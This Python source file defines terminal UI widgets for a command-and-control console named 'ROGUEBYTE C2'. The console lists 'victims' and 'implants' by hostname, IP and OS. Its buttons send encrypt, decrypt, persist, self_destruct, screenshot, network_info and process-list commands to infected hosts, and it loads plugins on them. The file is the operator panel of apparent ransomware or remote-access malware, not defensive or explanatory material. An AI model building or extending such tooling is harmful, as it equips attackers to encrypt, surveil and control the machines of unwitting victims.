from textual.widgets import Static, ListView, ListItem, RichLog, Input, Button
from textual.containers import Vertical, Horizontal
from textual.reactive import reactive


STATUS_COLORS = {
    'ONLINE': 'bold #00e676',
    'ENCRYPTED': 'bold #ff6b6b',
    'OFFLINE': 'dim #6e7681',
    'WATCHDOG': 'bold #ff9100',
}


class HeaderWidget(Static):
    def __init__(self, client):
        super().__init__()
        self.client = client

    def on_mount(self):
        self.refresh_content()

    def refresh_content(self):
        n_victims = len(self.client.victims)
        n_alerts = len(self.client.alert_log)
        dot = '●' if self.client.connected else '○'
        color = '#00e676' if self.client.connected else '#ff6b6b'
        self.update(
            f'[bold #00d4ff]ROGUEBYTE C2[/] [#ffd700]v0.1.9-Beta[/]    '
            f'[{color}]{dot} [{"#00e676" if self.client.connected else "#ff6b6b"}]'
            f'{"ONLINE" if self.client.connected else "OFFLINE"}[/]    '
            f'[#e6edf3]{n_victims} implant{"s" if n_victims != 1 else ""}[/]    '
            f'[#b388ff]{n_alerts} alert{"s" if n_alerts != 1 else ""}[/]'
        )


class InputBar(Input):
    def __init__(self, client):
        super().__init__(placeholder='Type command (help for list)')
        self.client = client


class VictimListWidget(ListView):
    def __init__(self, client):
        super().__init__()
        self.client = client

    def on_mount(self):
        self._rebuild()

    def refresh_content(self):
        self._rebuild()

    def _rebuild(self):
        self.clear()
        for hostname in sorted(self.client.victims.keys()):
            info = self.client.victims[hostname]
            data = info.get('data', {})
            status = (data.get('status') or 'ONLINE').upper()
            c = STATUS_COLORS.get(status, '#e6edf3')
            label = Label(f'[{c}]● {hostname}  {status}[/]')
            self.append(ListItem(label, id=f'v-{hostname}'))

    def on_list_view_selected(self, event):
        item_id = event.item.id
        if item_id and item_id.startswith('v-'):
            self.client.selected_hostname = item_id[2:]
            dp = self.screen.query_one('#detail-panel')
            if dp:
                dp.refresh_content()


CMD_BUTTONS = [
    ('encrypt', '#00e676'),
    ('decrypt', '#ff6b6b'),
    ('persist', '#ffd700'),
    ('status', '#6e7681'),
    ('self_destruct', '#ff4444'),
    ('screenshot', '#00d4ff'),
    ('network_info', '#b388ff'),
    ('pslist', '#ff9100'),
]


class DetailPanel(Vertical):
    def __init__(self, client):
        super().__init__(id='detail-panel')
        self.client = client

    def compose(self):
        yield Static(id='detail-info')
        yield Horizontal(*[
            Button(name, id=f'cmd-{name}')
            for name, _ in CMD_BUTTONS
        ], id='command-buttons')

    def on_mount(self):
        colors = {name: color for name, color in CMD_BUTTONS}
        for btn in self.query(Button):
            name = btn.id[4:]
            c = colors.get(name, '#e6edf3')
            btn.styles.margin = (0, 0, 0, 1)
            btn.styles.min_width = 12
            btn.styles.background = '#1a1a2e'
            btn.styles.color = c
            btn.styles.border = ('solid', '#2d2d3d')

    def refresh_content(self):
        hostname = self.client.selected_hostname
        info_text = self.query_one('#detail-info', Static)
        if not hostname or hostname not in self.client.victims:
            info_text.update('[dim]No implant selected[/]')
            return
        info = self.client.victims[hostname]
        data = info.get('data', {})
        last = info.get('last_seen', '')
        status = (data.get('status') or 'ONLINE').upper()
        sc = STATUS_COLORS.get(status, '#e6edf3')
        plugins = ', '.join(data.get('loaded_plugins', [])) or '[dim]none[/]'
        last_result = info.get('last_result')
        result_str = f'[#6e7681]Last:[/] {str(last_result.get("result", ""))[:60]}' if last_result else ''

        info_text.update(
            f'[bold #ffd700]═══ {hostname} ═══[/]\n'
            f'[#6e7681]IP:[/]      {data.get("ip", "?")}\n'
            f'[#6e7681]OS:[/]     {str(data.get("os", "?"))[:40]}\n'
            f'[#6e7681]Status:[/]  [{sc}]{status}[/]\n'
            f'[#6e7681]Plugins:[/] {plugins}\n'
            f'[#6e7681]Last:[/]    {last[:19] if last else "?"}\n'
            f'{result_str}'
        )

    def on_button_pressed(self, event: Button.Pressed):
        cmd = event.button.id
        if cmd and cmd.startswith('cmd-'):
            name = cmd[4:]
            hostname = self.client.selected_hostname
            if not hostname:
                return
            params = {}
            if name in ('exec', 'load_plugin', 'unload_plugin',
                        'download', 'upload', 'pskill', 'find_files'):
                return
            self.client.send_command(hostname, name, params)
            screen = self.screen
            if hasattr(screen, '_log'):
                screen._log(f'{name} → {hostname}')


class CommandLogWidget(RichLog):
    def __init__(self, client):
        super().__init__(highlight=True, markup=True, max_lines=100)
        self.client = client

    def on_mount(self):
        self.refresh_content()

    def refresh_content(self):
        self.clear()
        for entry in self.client.logs[:50]:
            ts = str(entry.get('timestamp', ''))[:19]
            host = entry.get('hostname', '?')
            cmd = entry.get('command', '?')
            result = entry.get('result', '')
            r_short = result[:40] if result else ''
            self.write(f'[#6e7681]{ts}[/] [#00d4ff]{cmd}[/] → [#ffd700]{host}[/]  {r_short}')


class PluginsPanelWidget(Static):
    def __init__(self, client):
        super().__init__()
        self.client = client

    def on_mount(self):
        self.refresh_content()

    def refresh_content(self):
        lines = ['[bold #ffd700]═══ Server Plugins ═══[/]']
        if self.client.plugins:
            for p in self.client.plugins:
                name = p.get('name', '?')
                ver = p.get('version', '?')
                desc = p.get('description', '')
                lines.append(f'  [#00d4ff]{name}[/] [#6e7681]v{ver}[/] — {desc}')
        else:
            lines.append('  [dim]No plugins on server[/]')

        lines.append('')
        lines.append('[bold #ffd700]═══ Loaded by Victim ═══[/]')
        any_plugins = False
        for hostname in sorted(self.client.victims.keys()):
            data = self.client.victims[hostname].get('data', {})
            plugins = data.get('loaded_plugins', [])
            if plugins:
                any_plugins = True
                lines.append(f'  [#ffd700]{hostname}[/]: {", ".join(plugins)}')
        if not any_plugins:
            lines.append('  [dim]No plugins loaded on any victim[/]')

        lines.extend([
            '',
            '[dim]Commands (type in input bar, then Enter):[/]',
            '  l <name>  — load plugin on selected victim',
            '  u <name>  — unload plugin from selected victim',
            '  plugins   — refresh this panel',
        ])
        self.update('\n'.join(lines))


class AlertsPanelWidget(Static):
    def __init__(self, client):
        super().__init__()
        self.client = client

    def on_mount(self):
        self.refresh_content()

    def refresh_content(self):
        lines = ['[bold #ffd700]═══ Alert Rules ═══[/]']
        if self.client.alert_rules:
            for r in self.client.alert_rules:
                name = r.get('name', '?')
                enabled = r.get('enabled', False)
                field = r.get('field', '')
                op = r.get('operator', '')
                val = r.get('value', '')
                action = r.get('action_type', '')
                s = '[#00e676]●[/]' if enabled else '[#6e7681]○[/]'
                lines.append(f'  {s} [#00d4ff]{name}[/] — {field} {op} {val} → {action}')
        else:
            lines.append('  [dim]No rules configured[/]')

        lines.append('')
        lines.append('[bold #ffd700]═══ Alert Feed ═══[/]')
        if self.client.alert_log:
            for a in self.client.alert_log[:30]:
                ts = str(a.get('timestamp', ''))[:19]
                rule = a.get('rule', '?')
                host = a.get('hostname', '?')
                action = a.get('action', '')
                val = str(a.get('value', ''))[:40]
                lines.append(f'  [#6e7681]{ts}[/] [#ffd700]{rule}[/] → '
                             f'[#00d4ff]{host}[/] [dim]{val}[/]')
        else:
            lines.append('  [dim]No alerts yet[/]')

        self.update('\n'.join(lines))


class Label(Static):
    pass
